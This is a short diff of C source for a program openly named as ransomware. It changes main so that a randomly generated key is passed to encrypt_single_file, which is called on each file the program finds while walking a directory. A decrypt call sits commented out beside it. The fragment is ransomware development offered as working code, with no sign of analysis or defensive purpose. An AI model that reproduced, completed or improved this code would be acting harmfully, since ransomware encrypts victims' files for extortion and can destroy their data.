@@ -18,6 +18,7 @@
 #include "ransomware.h"
 
 int main(){
+        char* key = rand_key_generator();
 
       struct _finddata_t fd;
         long* handle;
@@ -52,7 +53,7 @@ int main(){
                 printf("file name : %s \n", fileName);
 
                 // strcat(folderName,fileName);
-                encrypt_single_file(fileName,filesaveway);
+                encrypt_single_file(fileName, key, filesaveway);
                 // decrypt_single_file(fileName, inputkey, filesaveway);
 
     }
